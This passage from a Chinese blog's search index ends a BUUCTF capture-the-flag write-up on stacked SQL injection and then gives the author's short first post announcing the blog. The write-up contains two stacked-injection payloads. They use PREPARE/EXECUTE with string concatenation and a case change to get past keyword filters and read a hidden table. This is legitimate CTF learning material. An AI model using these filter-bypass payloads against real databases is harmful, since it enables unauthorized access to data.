一个sql语句;</p><p>EXECUTE name1；</p><p>name1,name2的意思是一个名字</p><p>其实两者原理都一样</p><p>构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @a = concat(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prepare b from @a;EXECUTE b;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349034.png" alt="img"></p><p>strstr()函数对大小写很敏感，通过大写绕过即可。</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349106.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;Set @a = concat(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;); Prepare b from @a; EXECUTE b;</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog202303082349435.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> buuctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> 报错注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小破站破壳了</title>
      <link href="/post/1c316701.html"/>
      <url>/post/1c316701.html</url>
      
        <content type="html"><![CDATA[<p>想来想去，看了其他许多大佬的文章，起初萌生了想建造一个属于自己的网站，但是建站不是一个简单的事情，只靠我现在的知识水平是完全不够的，于是就想简单简答的建造一个博客，用来分享我的一些做题过程与生活琐事。</p><span id="more"></span><p>2023.2.5，今天属于我的博客小破站建成了（开心~），虽然只是简单运用了hexo和大家都知道的next主题，傻瓜式建造最后上传至github，但是整个过程还是蛮曲折的，建造过程报了好多错误，但是还是靠着查询一点一点修改，最终一个简简单单的小博客站建好了。</p><p>在这个博客中我会用来分享一些做题刷题的过程，其实就是监督自己，不要三天打鱼两天晒网。如果你看到我的wp中有错误，我非常欢迎您能给我指出。其次分享一下自己在生活中的所见所闻所感，让之后的自己回味会觉得之前的日子过得有意义一点。</p><p>希望我能守住自己的初心</p><p>2023.2.5 </p><p>Z1d10t</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
